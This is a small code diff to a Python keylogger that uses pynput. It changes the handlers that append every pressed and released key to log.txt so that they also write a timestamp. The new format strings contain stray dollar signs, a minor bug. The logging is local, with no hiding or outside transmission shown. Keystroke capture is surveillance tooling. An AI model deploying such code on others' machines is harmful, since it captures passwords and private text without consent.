@@ -1,5 +1,5 @@
 from pynput.keyboard import Key, Listener
-
+from time import *
 
 
 
@@ -19,7 +19,8 @@ def keylogpressed(key):
 
     
     with open("log.txt", "a") as f:
-        f.write(pressed)
+        current_time = time()
+        f.write(f"Key pressed at ${current_time}     ${pressed}")
 
     if key == Key.esc:
         # Stop listener
@@ -35,7 +36,8 @@ def keylogreleased(key):
 
     
     with open("log.txt", "a") as f:
-        f.write(released)
+        current_time = time()
+        f.write(f"Key released at ${current_time}     ${released}")
 
     if key == Key.esc:
         # Stop listener
